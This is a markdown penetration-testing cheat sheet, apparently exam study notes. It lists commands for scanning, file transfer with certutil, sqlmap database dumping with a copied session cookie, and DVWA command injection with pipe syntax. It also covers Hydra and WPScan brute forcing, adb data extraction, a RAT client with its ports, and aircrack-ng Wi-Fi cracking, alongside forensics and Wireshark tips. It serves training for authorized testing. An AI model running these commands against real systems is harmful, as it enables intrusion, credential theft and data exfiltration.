# 🛡️ Cybersecurity Golden Cheat Sheet (Master Copy)

A complete reference for Penetration Testing, Malware Analysis, and Network Forensics.

---

## 📂 1. File Sharing & Transfer (Windows ↔ Linux)
> **Common for both:** `python3 -m http.server 8080`

*   **Windows Download (Certutil):**  
    `Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg`
*   **Linux Download (wget):**  
    `wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg`

---

## 🔍 2. Enumeration & File Discovery
### Finding Files in Linux
*   **Visual Tree:** `tree` (Works on Windows & Linux)
*   **Find all .txt:** `sudo find / -name *.txt`
*   **Find specific name:** `sudo find / -name SpecificFileName.txt`
*   **Search in directory:** `sudo find /DirectoryName -name SpecificFileName.txt`
*   **Search current path:** `sudo find . -name SpecificFileName.txt`

### Infrastructure & Server ID
*   **Identify Servers:** `nmap -A -oN scans` (Use **mousepad** to search results easily).
*   **Domain Controller (DC) Check:** Look for **88/TCP (kerberos-sec)** and **389/TCP (LDAP)**. 
*   **Aggressive Scan:** Once a DC is found, perform an Aggressive scan for full details.
*   **Vulnerability Scan:** `nmap -Pn --script vuln <TIP> -T5`
*   **Web Discovery:** `dirb <targetDomain> -x eg.txt`
*   **Backup Scanner:** Use **OpenVAS** if Nmap fails.

---

## 📱 3. Mobile & IoT Security
*   **Port Check:** Check for port **5555** open.
*   **Connect:** `adb connect <TIP>:5555`
*   **Data Extraction:** `adb pull sdcard/`
*   **PhoneSploit:** `python3 phonesploitpro.py`  
    *(Interactive mode: **N** = Next page, **P** = Previous page)*
*   **IoT Analysis:** Use `mqtt` filter in Wireshark for published messages.

---

## 🕸️ 4. Web, SQLi & CMS
### SQLmap Workflow
1.  **Auth Setup:** View Profile > `document.cookie` in console > Copy value.
2.  **List DBs:** `sqlmap -u <url> --cookie "<value>" --dbs`
3.  **List Tables:** `sqlmap -u <url> --cookie "<value>" -D dbName --tables`
4.  **Dump Data:** `sqlmap -u <url> --cookie "<value>" -D dbName -T Users_Login --dump`

### WordPress (WPScan)
*   **Scan URL:** `wpscan -url <domain or ip>`
*   **Brute Force:** `wpscan -url <domain> -U user -P pass.txt`
*   **Enum Users:** `wpscan -url <domain> -e u`

### DVWA & Command Execution
*   **Execution syntax:** `|<commands>`
*   **Windows Display:** `| type "path"`
*   **Linux Display:** `| cat "path"`

---

## ☣️ 5. Malware Analysis & Forensics
### Binary & Static Analysis
*   **objdump:** `objdump -d <file>` (Disassemble) or `objdump -x <file>` (Headers).
*   **readpe:** `readpe --all <file.exe>` (Analyze PE headers).
*   **nm:** `nm -u <file>` (Undefined symbols).
*   **RAT Access:** **Theef** Tool (`Client210.exe`). Target ports: **9871**, **6703**.
*   **Entry Points/Linkers:** Use **PEiD** or **PE Explorer**.
*   **Entropy (Packed detection):** 
    *   **DIE (Detect It Easy)** for Windows.
    *   **ent** for Linux.

### Hashing & Crypto
*   **Windows Tool:** `HashMyFiles.exe` (Supports multiple files and **crc32**).
*   **Linux Hashing:** `sha256sum <file>` (or other algorithm prefixes).
*   **CryptoForge:** Files ending in `.cfe` (Right-click > Decrypt).
*   **BCTextEncoder:** Use the same tool to decode if used for encryption.
*   **Base64:**
    *   `echo "aGVsbG8=" | base64 --decode`
    *   `base64 -d Sniff.txt > secret.txt`

### Steganography
*   **Tools:** `OpenStego`, `steghide`.
*   **Double-Encryption:** Decrypt with password first, then use hash crackers/online tools.

---

## 🦈 6. Wireshark & Traffic Analysis
*   **IP Stats:** `Statistics` -> `IPv4` -> `Source and Destination`.
*   **Filter SYN (No ACK):** `tcp.flags.syn == 1 && tcp.flags.ack == 0`
*   **Filter Content:** `frame contains "string"`
*   **Expert Info:** `Analyze` -> `Expert Info`
*   **DoS Detection:** Check for high volume targeted at one IP from many sources with no reply.
*   **DDoS Graphing:** `Statistics` -> `I/O Graph` (Spikes indicate suspicious activity).

---

## 🔑 7. Remote Access & Privilege Escalation
### Common Ports
*   **22:** SSH | **23:** Telnet | **3389:** RDP

### SMB
*   **Check Shares:** `smbmap -H <TIP>` or `smbclient -L <TIP>`
*   **Access Share:** `smbclient //<TIP>/directory`
*   **Download File:** `get <FileName>`
*   **Brute Force:** `hydra -L users.txt -P pass.txt <TIP> smb -f`

### SSH & RDP
*   **SSH Login:** `ssh user@<IP>`
*   **RDP Login:** `xfreerdp /v:<TIP> /u:username` or **Remmina**.

### Hydra (General)
*   **FTP:** `hydra -L users.txt -P passwords.txt ftp://<TIP> -f`
*   **RDP:** `hydra -L users.txt -P passwords.txt rdp://<TIP> -f`
*   **SSH (Custom Port):** `hydra -L users.txt -P passwords.txt -s 2222 ssh://<TIP> -f`

### Privilege Escalation
*   **Root Access:** `sudo -i`
*   **Reference:** [GTFOBins](https://gtfobins.github.io/)

---

## 🔓 8. Password & Hash Cracking
*   **Tools:** `hashcat`, `john`, or online crackers.
*   **.cap Files:** `aircrack-ng -w wordlist.txt capture.cap`
*   **BSSID Filter:** `aircrack-ng -b <bssid> -w wifiPassList.txt handShakeCapture.cap`
*   **Find BSSID:** `aircrack-ng <filename>.cap`

---
> **Note:** For educational and authorized testing only.
